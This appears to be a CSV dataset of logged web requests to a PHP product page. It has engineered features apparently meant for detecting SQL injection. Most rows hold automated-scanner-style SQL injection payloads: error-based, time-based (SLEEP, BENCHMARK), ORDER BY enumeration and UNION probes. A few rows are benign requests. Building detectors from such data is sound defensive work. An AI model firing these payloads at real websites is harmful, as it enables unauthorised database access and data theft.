full_url,parsed_url,event_time,hostname,sql_keyword,params_length,request_volume,special_chars,value_to_length
/details.php?prod=5%20OR%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%288719%3D8719%2C1%29%29%29%2C0x7178706a71%29%2C8719%29&type=2,"/details.php?prod=5 OR GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(8719=8719,1))),0x7178706a71),8719)&type=2",1680093074.729914,10.0.2.31,3,85,4.2,0,3.5294117647058822
/details.php?prod=5%20AND%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285653%3D5653%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29&type=2,"/details.php?prod=5 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7176787171,(SELECT (ELT(5653=5653,1))),0x7178706a71)) USING utf8)))&type=2",1680093074.734531,10.0.2.31,3,117,4.2,0,2.5641025641025643
/details.php?prod=5%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%288934%3D8934%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29&type=2,"/details.php?prod=5 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7176787171,(SELECT (ELT(8934=8934,1))),0x7178706a71)) USING utf8)))&type=2",1680093074.748218,10.0.2.31,3,116,4.2,0,2.586206896551724
/details.php?prod=5%20AND%20%28SELECT%201102%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281102%3D1102%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29&type=2,"/details.php?prod=5 AND (SELECT 1102 FROM(SELECT COUNT(*),CONCAT(0x7176787171,(SELECT (ELT(1102=1102,1))),0x7178706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&type=2",1680093074.754324,10.0.2.31,6,166,4.2,0,3.6144578313253013
/details.php?prod=%28SELECT%20CONCAT%280x7176787171%2C%28ELT%282387%3D2387%2C1%29%29%2C0x7178706a71%29%29&type=2,"/details.php?prod=(SELECT CONCAT(0x7176787171,(ELT(2387=2387,1)),0x7178706a71))&type=2",1680093074.76742,10.0.2.31,1,62,4.2,0,1.6129032258064515
/details.php?prod=5&type=2,/details.php?prod=5&type=2,1680093074.782894,10.0.2.31,0,2,4.2,0,0.0
/details.php?prod=5&type=2,/details.php?prod=5&type=2,1680093074.793082,10.0.2.31,0,2,4.2,0,0.0
/details.php?prod=5&type=2,/details.php?prod=5&type=2,1680093074.796677,10.0.2.31,0,2,4.2,0,0.0
/details.php?prod=5&type=2,/details.php?prod=5&type=2,1680093074.801924,10.0.2.31,0,2,4.2,0,0.0
/details.php?prod=5&type=2,/details.php?prod=5&type=2,1680093074.807654,10.0.2.31,0,2,4.2,0,0.0
/details.php?prod=5&type=2,/details.php?prod=5&type=2,1680093074.812276,10.0.2.31,0,2,4.2,0,0.0
/details.php?prod=5&type=2,/details.php?prod=5&type=2,1680093074.815916,10.0.2.31,0,2,4.2,0,0.0
/details.php?prod=5&type=2,/details.php?prod=5&type=2,1680093074.824175,10.0.2.31,0,2,4.2,0,0.0
/details.php?prod=5&type=2,/details.php?prod=5&type=2,1680093074.829541,10.0.2.31,0,2,4.2,0,0.0
/details.php?prod=5%3BSELECT%20SLEEP%285%29%23&type=2,/details.php?prod=5;SELECT SLEEP(5)#&type=2,1680093074.836236,10.0.2.31,1,19,4.2,2,15.789473684210526
/details.php?prod=5%3BSELECT%20SLEEP%285%29&type=2,/details.php?prod=5;SELECT SLEEP(5)&type=2,1680093074.854201,10.0.2.31,1,18,4.2,1,11.11111111111111
/details.php?prod=5%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29shlX%29%23&type=2,/details.php?prod=5;(SELECT * FROM (SELECT(SLEEP(5)))shlX)#&type=2,1680093074.862158,10.0.2.31,2,42,4.2,2,9.523809523809524
/details.php?prod=5%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29kWCw%29&type=2,/details.php?prod=5;(SELECT * FROM (SELECT(SLEEP(5)))kWCw)&type=2,1680093074.87909,10.0.2.31,2,41,4.2,1,7.317073170731708
/details.php?prod=5%3BSELECT%20BENCHMARK%285000000%2CMD5%280x4a6f6b58%29%29%23&type=2,"/details.php?prod=5;SELECT BENCHMARK(5000000,MD5(0x4a6f6b58))#&type=2",1680093074.890175,10.0.2.31,1,45,4.2,2,6.666666666666667
/details.php?prod=5%3BSELECT%20BENCHMARK%285000000%2CMD5%280x4f6b4356%29%29&type=2,"/details.php?prod=5;SELECT BENCHMARK(5000000,MD5(0x4f6b4356))&type=2",1680093074.898144,10.0.2.31,1,44,4.2,1,4.545454545454546
/details.php?prod=5%20AND%20%28SELECT%206969%20FROM%20%28SELECT%28SLEEP%285%29%29%29AXjG%29&type=2,/details.php?prod=5 AND (SELECT 6969 FROM (SELECT(SLEEP(5)))AXjG)&type=2,1680093074.904236,10.0.2.31,3,48,4.2,0,6.25
/details.php?prod=5%20AND%20%28SELECT%206969%20FROM%20%28SELECT%28SLEEP%280%29%29%29AXjG%29&type=2,/details.php?prod=5 AND (SELECT 6969 FROM (SELECT(SLEEP(0)))AXjG)&type=2,1680093079.908793,10.0.2.31,3,48,4.2,0,6.25
/details.php?prod=5%20AND%20%28SELECT%206969%20FROM%20%28SELECT%28SLEEP%285%29%29%29AXjG%29&type=2,/details.php?prod=5 AND (SELECT 6969 FROM (SELECT(SLEEP(5)))AXjG)&type=2,1680093079.912018,10.0.2.31,3,48,4.2,0,6.25
/details.php?prod=5%20ORDER%20BY%201--%20-&type=2,/details.php?prod=5 ORDER BY 1-- -&type=2,1680093084.926514,10.0.2.31,2,17,1.9,1,17.647058823529413
/details.php?prod=5%20ORDER%20BY%209192--%20-&type=2,/details.php?prod=5 ORDER BY 9192-- -&type=2,1680093084.936275,10.0.2.31,2,20,1.9,1,15.0
/details.php?prod=5%20ORDER%20BY%2010--%20-&type=2,/details.php?prod=5 ORDER BY 10-- -&type=2,1680093084.945644,10.0.2.31,2,18,1.9,1,16.666666666666668
/details.php?prod=5%20ORDER%20BY%206--%20-&type=2,/details.php?prod=5 ORDER BY 6-- -&type=2,1680093084.969451,10.0.2.31,2,17,1.9,1,17.647058823529413
/details.php?prod=5%20ORDER%20BY%204--%20-&type=2,/details.php?prod=5 ORDER BY 4-- -&type=2,1680093084.984144,10.0.2.31,2,17,1.9,1,17.647058823529413
/details.php?prod=5%20ORDER%20BY%205--%20-&type=2,/details.php?prod=5 ORDER BY 5-- -&type=2,1680093084.990428,10.0.2.31,2,17,1.9,1,17.647058823529413
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176787171%2C0x6e62536f44566564455244695669786c737563647869424e7a504253434e6759454f474d69527a68%2C0x7178706a71%29%2CNULL%2CNULL--%20-&type=2,"/details.php?prod=5 UNION ALL SELECT NULL,NULL,CONCAT(0x7176787171,0x6e62536f44566564455244695669786c737563647869424e7a504253434e6759454f474d69527a68,0x7178706a71),NULL,NULL-- -&type=2",1680093084.999157,10.0.2.31,4,160,1.9,1,3.125
